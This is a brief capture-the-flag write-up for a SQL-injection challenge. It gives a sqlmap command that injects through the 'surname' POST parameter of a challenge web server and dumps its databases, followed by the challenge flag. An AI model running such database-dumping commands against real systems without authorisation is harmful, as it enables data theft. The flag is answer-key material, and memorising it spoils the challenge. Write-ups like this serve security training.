# Demo

## Description

Can you find the name of the bastard?

Check this out: [http://141.85.224.127:8083/](http://141.85.224.127:8083/)

## Solution

We dump the databases with the parameter `surname` to find the flag:

```bash
sqlmap -u "141.85.224.127:8083/index.php" --data 'surname=a' -p surname --batch --dump
```

## Flag

`SSS{mAsTeR_oF_sQlI}`
